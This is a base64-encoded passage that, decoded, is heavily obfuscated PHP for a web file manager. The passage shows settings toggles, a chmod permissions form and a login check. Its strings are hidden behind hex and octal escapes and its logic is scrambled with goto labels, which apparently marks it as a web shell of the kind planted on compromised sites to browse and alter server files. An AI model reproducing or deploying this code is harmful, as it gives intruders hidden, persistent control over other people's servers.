Y1x4NzVceDY1XHgzZFw0N3ska31cNDdceDIwIiAuIGdldFNlbGVjdGVkKCRrKSAuICJceDNleyR2fVx4M2NceDJmXHg2ZlwxNjBcMTY0XHg2OVwxNTdcMTU2XDc2IjsgfSA/PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9zZWxlY3Q+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDw/cGhwICBmdW5jdGlvbiBnZXRDaGVja2VkKCRjb25mLCAkdmFsLCAkdHh0KSB7IGlmICgkY29uZiA9PSAxICYmICR2YWwgPT0gMSkgeyByZXR1cm4gJHR4dDsgfSBlbHNlIHsgaWYgKCRjb25mID09ICcnICYmICR2YWwgPT0gJycpIHsgcmV0dXJuICR0eHQ7IH0gZWxzZSB7IHJldHVybiAnJzsgfSB9IH0gPz4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIHJvdyI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9ImpzLWVyci1ycHQtMSIgY2xhc3M9ImNvbC1zbS0zIGNvbC1mb3JtLWxhYmVsIj48P3BocCAgZWNobyBsbmcoIlwxMDVceDcyXDE2MlwxNTdcMTYyXHg1MlwxNDVcMTYwXDE1N1wxNjJceDc0XHg2OVwxNTZcMTQ3Iik7ID8+CjwvbGFiZWw+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC1zbS05Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImJ0bi1ncm91cCBidG4tZ3JvdXAtdG9nZ2xlIiBkYXRhLXRvZ2dsZT0iYnV0dG9ucyI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxhYmVsIGNsYXNzPSJidG4gYnRuLXNlY29uZGFyeSA8P3BocCAgZWNobyBnZXRDaGVja2VkKCRyZXBvcnRfZXJyb3JzLCAxLCAiXHg2MVx4NjNcMTY0XDE1MVx4NzZceDY1Iik7ID8+CiI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJyYWRpbyIgbmFtZT0ianMtZXJyb3ItcmVwb3J0IiBpZD0ianMtZXJyLXJwdC0xIiBhdXRvY29tcGxldGU9Im9mZiIgdmFsdWU9InRydWUiIDw/cGhwICBlY2hvIGdldENoZWNrZWQoJHJlcG9ydF9lcnJvcnMsIDEsICJcMTQzXDE1MFwxNDVceDYzXHg2YlwxNDVcMTQ0Iik7ID8+CiA+IE9OCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9sYWJlbD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWwgY2xhc3M9ImJ0biBidG4tc2Vjb25kYXJ5IDw/cGhwICBlY2hvIGdldENoZWNrZWQoJHJlcG9ydF9lcnJvcnMsICcnLCAiXDE0MVwxNDNcMTY0XDE1MVwxNjZceDY1Iik7ID8+CiI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJyYWRpbyIgbmFtZT0ianMtZXJyb3ItcmVwb3J0IiBpZD0ianMtZXJyLXJwdC0wIiBhdXRvY29tcGxldGU9Im9mZiIgdmFsdWU9ImZhbHNlIiA8P3BocCAgZWNobyBnZXRDaGVja2VkKCRyZXBvcnRfZXJyb3JzLCAnJywgIlwxNDNceDY4XHg2NVwxNDNceDZiXHg2NVwxNDQiKTsgPz4KID4gT0ZGCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9sYWJlbD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KCiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCByb3ciPgogICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJqcy1oZG4tMSIgY2xhc3M9ImNvbC1zbS0zIGNvbC1mb3JtLWxhYmVsIj48P3BocCAgZWNobyBsbmcoIlx4NTNceDY4XHg2Zlx4NzdcMTEwXDE1MVx4NjRceDY0XDE0NVx4NmVcMTA2XDE1MVx4NmNcMTQ1XDE2MyIpOyA/Pgo8L2xhYmVsPgogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtc20tOSI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJidG4tZ3JvdXAgYnRuLWdyb3VwLXRvZ2dsZSIgZGF0YS10b2dnbGU9ImJ1dHRvbnMiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxsYWJlbCBjbGFzcz0iYnRuIGJ0bi1zZWNvbmRhcnkgPD9waHAgIGVjaG8gZ2V0Q2hlY2tlZCgkc2hvd19oaWRkZW5fZmlsZXMsIDEsICJcMTQxXDE0M1x4NzRceDY5XDE2NlwxNDUiKTsgPz4KIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InJhZGlvIiBuYW1lPSJqcy1zaG93LWhpZGRlbiIgaWQ9ImpzLWhkbi0xIiBhdXRvY29tcGxldGU9Im9mZiIgdmFsdWU9InRydWUiIDw/cGhwICBlY2hvIGdldENoZWNrZWQoJHNob3dfaGlkZGVuX2ZpbGVzLCAxLCAiXHg2M1x4NjhcMTQ1XDE0M1x4NmJceDY1XHg2NCIpOyA/PgogPiBPTgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvbGFiZWw+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxhYmVsIGNsYXNzPSJidG4gYnRuLXNlY29uZGFyeSA8P3BocCAgZWNobyBnZXRDaGVja2VkKCRzaG93X2hpZGRlbl9maWxlcywgJycsICJceDYxXHg2M1wxNjRcMTUxXDE2Nlx4NjUiKTsgPz4KIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InJhZGlvIiBuYW1lPSJqcy1zaG93LWhpZGRlbiIgaWQ9ImpzLWhkbi0wIiBhdXRvY29tcGxldGU9Im9mZiIgdmFsdWU9ImZhbHNlIiA8P3BocCAgZWNobyBnZXRDaGVja2VkKCRzaG93X2hpZGRlbl9maWxlcywgJycsICJceDYzXHg2OFwxNDVceDYzXDE1M1x4NjVceDY0Iik7ID8+CiA+IE9GRgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvbGFiZWw+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPC9kaXY+CgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgcm93Ij4KICAgICAgICAgICAgICAgICAgICAgICAgPGxhYmVsIGZvcj0ianMtaGlkLTEiIGNsYXNzPSJjb2wtc20tMyBjb2wtZm9ybS1sYWJlbCI+PD9waHAgIGVjaG8gbG5nKCJceDQ4XHg2OVx4NjRceDY1XHg0M1wxNTdcMTU0XHg3NVx4NmRceDZlXDE2MyIpOyA/Pgo8L2xhYmVsPgogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtc20tOSI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJidG4tZ3JvdXAgYnRuLWdyb3VwLXRvZ2dsZSIgZGF0YS10b2dnbGU9ImJ1dHRvbnMiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxsYWJlbCBjbGFzcz0iYnRuIGJ0bi1zZWNvbmRhcnkgPD9waHAgIGVjaG8gZ2V0Q2hlY2tlZCgkaGlkZV9Db2xzLCAxLCAiXDE0MVx4NjNcMTY0XDE1MVx4NzZcMTQ1Iik7ID8+CiI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJyYWRpbyIgbmFtZT0ianMtaGlkZS1jb2xzIiBpZD0ianMtaGlkLTEiIGF1dG9jb21wbGV0ZT0ib2ZmIiB2YWx1ZT0idHJ1ZSIgPD9waHAgIGVjaG8gZ2V0Q2hlY2tlZCgkaGlkZV9Db2xzLCAxLCAiXHg2M1wxNTBceDY1XHg2M1wxNTNceDY1XDE0NCIpOyA/PgogPiBPTgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvbGFiZWw+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxhYmVsIGNsYXNzPSJidG4gYnRuLXNlY29uZGFyeSA8P3BocCAgZWNobyBnZXRDaGVja2VkKCRoaWRlX0NvbHMsICcnLCAiXHg2MVwxNDNceDc0XDE1MVwxNjZceDY1Iik7ID8+CiI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJyYWRpbyIgbmFtZT0ianMtaGlkZS1jb2xzIiBpZD0ianMtaGlkLTAiIGF1dG9jb21wbGV0ZT0ib2ZmIiB2YWx1ZT0iZmFsc2UiIDw/cGhwICBlY2hvIGdldENoZWNrZWQoJGhpZGVfQ29scywgJycsICJcMTQzXHg2OFwxNDVcMTQzXHg2Ylx4NjVcMTQ0Iik7ID8+CiA+IE9GRgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvbGFiZWw+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPC9kaXY+CgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgcm93Ij4KICAgICAgICAgICAgICAgICAgICAgICAgPGxhYmVsIGZvcj0ianMtZGlyLTEiIGNsYXNzPSJjb2wtc20tMyBjb2wtZm9ybS1sYWJlbCI+PD9waHAgIGVjaG8gbG5nKCJceDQzXDE0MVx4NmNcMTQzXHg3NVwxNTRceDYxXDE2NFwxNDVceDQ2XDE1N1x4NmNcMTQ0XDE0NVx4NzJceDUzXDE1MVwxNzJceDY1Iik7ID8+CjwvbGFiZWw+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC1zbS05Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImJ0bi1ncm91cCBidG4tZ3JvdXAtdG9nZ2xlIiBkYXRhLXRvZ2dsZT0iYnV0dG9ucyI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxhYmVsIGNsYXNzPSJidG4gYnRuLXNlY29uZGFyeSA8P3BocCAgZWNobyBnZXRDaGVja2VkKCRjYWxjX2ZvbGRlciwgMSwgIlwxNDFceDYzXDE2NFx4NjlcMTY2XDE0NSIpOyA/PgoiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0icmFkaW8iIG5hbWU9ImpzLWNhbGMtZm9sZGVyIiBpZD0ianMtZGlyLTEiIGF1dG9jb21wbGV0ZT0ib2ZmIiB2YWx1ZT0idHJ1ZSIgPD9waHAgIGVjaG8gZ2V0Q2hlY2tlZCgkY2FsY19mb2xkZXIsIDEsICJcMTQzXDE1MFwxNDVcMTQzXHg2Ylx4NjVcMTQ0Iik7ID8+CiA+IE9OCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9sYWJlbD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWwgY2xhc3M9ImJ0biBidG4tc2Vjb25kYXJ5IDw/cGhwICBlY2hvIGdldENoZWNrZWQoJGNhbGNfZm9sZGVyLCAnJywgIlwxNDFcMTQzXDE2NFwxNTFcMTY2XHg2NSIpOyA/PgoiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0icmFkaW8iIG5hbWU9ImpzLWNhbGMtZm9sZGVyIiBpZD0ianMtZGlyLTAiIGF1dG9jb21wbGV0ZT0ib2ZmIiB2YWx1ZT0iZmFsc2UiIDw/cGhwICBlY2hvIGdldENoZWNrZWQoJGNhbGNfZm9sZGVyLCAnJywgIlwxNDNcMTUwXDE0NVx4NjNcMTUzXDE0NVx4NjQiKTsgPz4KID4gT0ZGCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9sYWJlbD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIHJvdyI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9ImpzLTMtMSIgY2xhc3M9ImNvbC1zbS0zIGNvbC1mb3JtLWxhYmVsIj48P3BocCAgZWNobyBsbmcoIlwxMjRcMTUwXDE0NVwxNTVceDY1Iik7ID8+CjwvbGFiZWw+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC1zbS01Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzZWxlY3QgY2xhc3M9ImZvcm0tY29udHJvbCIgaWQ9ImpzLTMtMCIgbmFtZT0ianMtdGhlbWUtMyIgc3R5bGU9IndpZHRoOjEwMHB4OyI+CiAgICAgICAgICAgICAgICAgICAgICAgICA8b3B0aW9uIHZhbHVlPSdsaWdodCcgPD9waHAgIGlmICgkdGhlbWUgPT0gIlx4NmNcMTUxXDE0N1x4NjhcMTY0IikgeyBlY2hvICJcMTYzXDE0NVwxNTRceDY1XDE0M1wxNjRcMTQ1XHg2NCI7IH0gPz4KPjw/cGhwICBlY2hvIGxuZygiXDE1NFx4NjlceDY3XHg2OFx4NzQiKTsgPz4KPC9vcHRpb24+CiAgICAgICAgICAgICAgICAgICAgICAgICA8b3B0aW9uIHZhbHVlPSdkYXJrJyA8P3BocCAgaWYgKCR0aGVtZSA9PSAiXHg2NFx4NjFcMTYyXHg2YiIpIHsgZWNobyAiXDE2M1wxNDVcMTU0XDE0NVwxNDNcMTY0XDE0NVx4NjQiOyB9ID8+Cj48P3BocCAgZWNobyBsbmcoIlx4NjRceDYxXDE2MlwxNTMiKTsgPz4KPC9vcHRpb24+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L3NlbGVjdD4KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPC9kaXY+CgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgcm93Ij4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLXNtLTEwIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIGJ0bi1zdWNjZXNzIj4gPGkgY2xhc3M9ImZhIGZhLWNoZWNrLWNpcmNsZSI+PC9pPiA8P3BocCAgZWNobyBsbmcoIlwxMjNcMTQxXDE2NlwxNDUiKTsgPz4KPC9idXR0b24+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgoKICAgICAgICAgICAgICAgIDwvZm9ybT4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KICAgIDw/cGhwICBmbV9zaG93X2Zvb3RlcigpOyBkaWU7IH0gZ290byB1MnhJZDsgcnZlbWk6IGlmIChpc3NldCgkX0dFVFsiXHg2M1x4NjhceDZkXHg2ZlwxNDQiXSkgJiYgIUZNX1JFQURPTkxZICYmICFGTV9JU19XSU4pIHsgJGZpbGUgPSAkX0dFVFsiXDE0M1wxNTBcMTU1XDE1N1x4NjQiXTsgJGZpbGUgPSBmbV9jbGVhbl9wYXRoKCRmaWxlKTsgJGZpbGUgPSBzdHJfcmVwbGFjZSgiXHgyZiIsICcnLCAkZmlsZSk7IGlmICgkZmlsZSA9PSAnJyB8fCAhaXNfZmlsZSgkcGF0aCAuICJcNTciIC4gJGZpbGUpICYmICFpc19kaXIoJHBhdGggLiAiXDU3IiAuICRmaWxlKSkgeyBmbV9zZXRfbXNnKGxuZygiXDEwNlx4NjlcMTU0XHg2NVw0MFwxNTZcMTU3XDE2NFx4MjBcMTQ2XDE1N1wxNjVceDZlXHg2NCIpLCAiXDE0NVx4NzJcMTYyXHg2ZlwxNjIiKTsgZm1fcmVkaXJlY3QoRk1fU0VMRl9VUkwgLiAiXHgzZlx4NzBcNzUiIC4gdXJsZW5jb2RlKEZNX1BBVEgpKTsgfSBmbV9zaG93X2hlYWRlcigpOyBmbV9zaG93X25hdl9wYXRoKEZNX1BBVEgpOyAkZmlsZV91cmwgPSBGTV9ST09UX1VSTCAuIChGTV9QQVRIICE9ICcnID8gIlx4MmYiIC4gRk1fUEFUSCA6ICcnKSAuICJcNTciIC4gJGZpbGU7ICRmaWxlX3BhdGggPSAkcGF0aCAuICJcNTciIC4gJGZpbGU7ICRtb2RlID0gZmlsZXBlcm1zKCRwYXRoIC4gIlx4MmYiIC4gJGZpbGUpOyA/PgogICAgPGRpdiBjbGFzcz0icGF0aCI+CiAgICAgICAgPGRpdiBjbGFzcz0iY2FyZCBtYi0yIDw/cGhwICBlY2hvIGZtX2dldF90aGVtZSgpOyA/PgoiPgogICAgICAgICAgICA8aDYgY2xhc3M9ImNhcmQtaGVhZGVyIj4KICAgICAgICAgICAgICAgIDw/cGhwICBlY2hvIGxuZygiXDEwM1wxNTBcMTQxXHg2ZVx4NjdceDY1XHg1MFx4NjVceDcyXHg2ZFx4NjlceDczXHg3M1wxNTFcMTU3XHg2ZVwxNjMiKTsgPz4KICAgICAgICAgICAgPC9oNj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1ib2R5Ij4KICAgICAgICAgICAgICAgIDxwIGNsYXNzPSJjYXJkLXRleHQiPgogICAgICAgICAgICAgICAgICAgIEZ1bGwgcGF0aDogPD9waHAgIGVjaG8gJGZpbGVfcGF0aDsgPz4KPGJyPgogICAgICAgICAgICAgICAgPC9wPgogICAgICAgICAgICAgICAgPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCI+CiAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0icCIgdmFsdWU9Ijw/cGhwICBlY2hvIGZtX2VuYyhGTV9QQVRIKTsgPz4KIj4KICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJjaG1vZCIgdmFsdWU9Ijw/cGhwICBlY2hvIGZtX2VuYygkZmlsZSk7ID8+CiI+CgogICAgICAgICAgICAgICAgICAgIDx0YWJsZSBjbGFzcz0idGFibGUgY29tcGFjdC10YWJsZSA8P3BocCAgZWNobyBmbV9nZXRfdGhlbWUoKTsgPz4KIj4KICAgICAgICAgICAgICAgICAgICAgICAgPHRyPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHRkPjwvdGQ+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQ+PGI+PD9waHAgIGVjaG8gbG5nKCJceDRmXDE2N1wxNTZceDY1XHg3MiIpOyA/Pgo8L2I+PC90ZD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD48Yj48P3BocCAgZWNobyBsbmcoIlx4NDdceDcyXHg2Zlx4NzVceDcwIik7ID8+CjwvYj48L3RkPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHRkPjxiPjw/cGhwICBlY2hvIGxuZygiXDExN1wxNjRceDY4XDE0NVwxNjIiKTsgPz4KPC9iPjwvdGQ+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvdHI+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0cj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZCBzdHlsZT0idGV4dC1hbGlnbjogcmlnaHQiPjxiPjw/cGhwICBlY2hvIGxuZygiXHg1Mlx4NjVceDYxXHg2NCIpOyA/Pgo8L2I+PC90ZD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD48bGFiZWw+PGlucHV0IHR5cGU9ImNoZWNrYm94IiBuYW1lPSJ1ciIgdmFsdWU9IjEiPD9waHAgIGVjaG8gJG1vZGUgJiAyNTYgPyAiXHgyMFx4NjNceDY4XDE0NVx4NjNceDZiXHg2NVwxNDQiIDogJyc7ID8+Cj48L2xhYmVsPjwvdGQ+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQ+PGxhYmVsPjxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0iZ3IiIHZhbHVlPSIxIjw/cGhwICBlY2hvICRtb2RlICYgMzIgPyAiXDQwXHg2M1wxNTBceDY1XHg2M1wxNTNceDY1XHg2NCIgOiAnJzsgPz4KPjwvbGFiZWw+PC90ZD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD48bGFiZWw+PGlucHV0IHR5cGU9ImNoZWNrYm94IiBuYW1lPSJvciIgdmFsdWU9IjEiPD9waHAgIGVjaG8gJG1vZGUgJiA0ID8gIlx4MjBcMTQzXDE1MFwxNDVcMTQzXDE1M1x4NjVcMTQ0IiA6ICcnOyA/Pgo+PC9sYWJlbD48L3RkPgogICAgICAgICAgICAgICAgICAgICAgICA8L3RyPgogICAgICAgICAgICAgICAgICAgICAgICA8dHI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQgc3R5bGU9InRleHQtYWxpZ246IHJpZ2h0Ij48Yj48P3BocCAgZWNobyBsbmcoIlx4NTdceDcyXDE1MVx4NzRcMTQ1Iik7ID8+CjwvYj48L3RkPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHRkPjxsYWJlbD48aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9InV3IiB2YWx1ZT0iMSI8P3BocCAgZWNobyAkbW9kZSAmIDEyOCA/ICJcNDBceDYzXHg2OFwxNDVceDYzXDE1M1wxNDVceDY0IiA6ICcnOyA/Pgo+PC9sYWJlbD48L3RkPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHRkPjxsYWJlbD48aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9Imd3IiB2YWx1ZT0iMSI8P3BocCAgZWNobyAkbW9kZSAmIDE2ID8gIlx4MjBcMTQzXDE1MFx4NjVcMTQzXHg2Ylx4NjVceDY0IiA6ICcnOyA/Pgo+PC9sYWJlbD48L3RkPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHRkPjxsYWJlbD48aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9Im93IiB2YWx1ZT0iMSI8P3BocCAgZWNobyAkbW9kZSAmIDIgPyAiXDQwXHg2M1x4NjhcMTQ1XHg2M1wxNTNcMTQ1XDE0NCIgOiAnJzsgPz4KPjwvbGFiZWw+PC90ZD4KICAgICAgICAgICAgICAgICAgICAgICAgPC90cj4KICAgICAgICAgICAgICAgICAgICAgICAgPHRyPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHRkIHN0eWxlPSJ0ZXh0LWFsaWduOiByaWdodCI+PGI+PD9waHAgIGVjaG8gbG5nKCJcMTA1XDE3MFwxNDVcMTQzXHg3NVx4NzRceDY1Iik7ID8+CjwvYj48L3RkPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHRkPjxsYWJlbD48aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9InV4IiB2YWx1ZT0iMSI8P3BocCAgZWNobyAkbW9kZSAmIDY0ID8gIlx4MjBcMTQzXHg2OFwxNDVceDYzXDE1M1wxNDVcMTQ0IiA6ICcnOyA/Pgo+PC9sYWJlbD48L3RkPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHRkPjxsYWJlbD48aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9Imd4IiB2YWx1ZT0iMSI8P3BocCAgZWNobyAkbW9kZSAmIDggPyAiXHgyMFx4NjNceDY4XHg2NVx4NjNceDZiXHg2NVwxNDQiIDogJyc7ID8+Cj48L2xhYmVsPjwvdGQ+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQ+PGxhYmVsPjxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0ib3giIHZhbHVlPSIxIjw/cGhwICBlY2hvICRtb2RlICYgMSA/ICJceDIwXDE0M1x4NjhcMTQ1XHg2M1wxNTNceDY1XDE0NCIgOiAnJzsgPz4KPjwvbGFiZWw+PC90ZD4KICAgICAgICAgICAgICAgICAgICAgICAgPC90cj4KICAgICAgICAgICAgICAgICAgICA8L3RhYmxlPgoKICAgICAgICAgICAgICAgICAgICA8cD4KICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLXN1Y2Nlc3MiPjxpIGNsYXNzPSJmYSBmYS1jaGVjay1jaXJjbGUiPjwvaT4gPD9waHAgIGVjaG8gbG5nKCJceDQzXHg2OFx4NjFcMTU2XDE0N1x4NjUiKTsgPz4KPC9idXR0b24+ICZuYnNwOwogICAgICAgICAgICAgICAgICAgICAgICA8Yj48YSBocmVmPSI/cD08P3BocCAgZWNobyB1cmxlbmNvZGUoRk1fUEFUSCk7ID8+CiIgY2xhc3M9ImJ0biBidG4tb3V0bGluZS1wcmltYXJ5Ij48aSBjbGFzcz0iZmEgZmEtdGltZXMtY2lyY2xlIj48L2k+IDw/cGhwICBlY2hvIGxuZygiXHg0M1wxNDFcMTU2XDE0M1x4NjVcMTU0Iik7ID8+CjwvYT48L2I+CiAgICAgICAgICAgICAgICAgICAgPC9wPgogICAgICAgICAgICAgICAgPC9mb3JtPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgIDwvZGl2PgogICAgPD9waHAgIGZtX3Nob3dfZm9vdGVyKCk7IGRpZTsgfSBnb3RvIEZCclRJOyBwa3dMNDogJGRhdGEgPSAiXDc0XDQwXHgzY1x4MjBceGYwXHg5ZFx4OTBcMjIxXHhmMFwyMzVcMjIwXDIwNFwzNjBceDlkXDIyMFwyMjJcMzYwXDIzNVwyMjBcMjI0XDM2MFwyMzVceDkwXHg4Ylx4ZjBceDlkXDIyMFwyMjNceDIwXHhmMFx4OWRceDkwXHg5NlwzNjBceDlkXHg5MFx4ODRceGYwXDIzNVwyMjBceDgxXHhmMFx4OWRceDkwXDIyMlwzNjBcMjM1XHg5MFx4ODdceGYwXHg5ZFwyMjBcMjA0XHhmMFwyMzVceDkwXDIxM1wzNjBceDlkXDIyMFx4OGJcNDBcNzZcNDBceDNlXDM2MFx4OWZceDk0XDIyMFwxMlx4YVwxMDFcMTUzXDE2M1x4NjVceDczXHgzYVw0MHskeF9wYXRofVx4MjBcMTIiOyBnb3RvIHczclNiOyBkYm95RTogZnVuY3Rpb24gZm1fZ2V0X3ZpZGVvX2V4dHMoKSB7IHJldHVybiBhcnJheSgiXHg2MVx4NzZcMTUxIiwgIlx4NzdceDY1XHg2Mlx4NmQiLCAiXHg3N1x4NmRcMTY2IiwgIlwxNTVcMTYwXHgzNCIsICJceDZkXHgzNFwxNjYiLCAiXHg2ZlwxNDdceDZkIiwgIlx4NmZceDY3XDE2NiIsICJceDZkXDE1N1x4NzYiLCAiXHg2ZFx4NmJcMTY2Iik7IH0gZ290byB3YTRRVTsgaWN0SDc6IGZ1bmN0aW9uIGZtX2lzX2ZpbGVfYWxsb3dlZCgkZmlsZW5hbWUpIHsgJGFsbG93ZWQgPSBmYWxzZTsgaWYgKEZNX0VYVEVOU0lPTikgeyAkZXh0ID0gc3RydG9sb3dlcihwYXRoaW5mbygkZmlsZW5hbWUsIFBBVEhJTkZPX0VYVEVOU0lPTikpOyBpZiAoaW5fYXJyYXkoJGV4dCwgZXhwbG9kZSgiXDU0Iiwgc3RydG9sb3dlcihGTV9FWFRFTlNJT04pKSkpIHsgJGFsbG93ZWQgPSB0cnVlOyB9IH0gcmV0dXJuICRhbGxvd2VkOyB9IGdvdG8gSGxRRXY7IFhZT3dSOiAkcm9vdF91cmwgPSAnJzsgZ290byBBZnZCOTsgYl9rbGc6ICRyb290X3BhdGggPSBydHJpbSgkcm9vdF9wYXRoLCAiXDEzNFx4MmYiKTsgZ290byBCc1gxMTsgaWQ3eW06IGlmICgkdXNlX2F1dGgpIHsgaWYgKGlzc2V0KCRfU0VTU0lPTltGTV9TRVNTSU9OX0lEXVsiXHg2Y1x4NmZceDY3XHg2N1wxNDVceDY0Il0sICRhdXRoX3VzZXJzWyRfU0VTU0lPTltGTV9TRVNTSU9OX0lEXVsiXDE1NFwxNTdceDY3XDE0N1wxNDVceDY0Il1dKSkgeyB9IGVsc2VpZiAoaXNzZXQoJF9QT1NUWyJceDY2XDE1NVx4NWZceDc1XHg3M1x4NzIiXSwgJF9QT1NUWyJcMTQ2XDE1NVx4NWZceDcwXHg3N1x4NjQiXSkpIHsgc2xlZXAoMSk7IGlmIChmdW5jdGlvbl9leGlzdHMoIlwxNjBceDYxXHg3M1wxNjNceDc3XHg2Zlx4NzJceDY0XDEzN1x4NzZceDY1XHg3Mlx4NjlceDY2XDE3MSIpKSB7IGlmIChpc3NldCgkYXV0aF91c2Vyc1skX1BPU1RbIlwxNDZcMTU1XDEzN1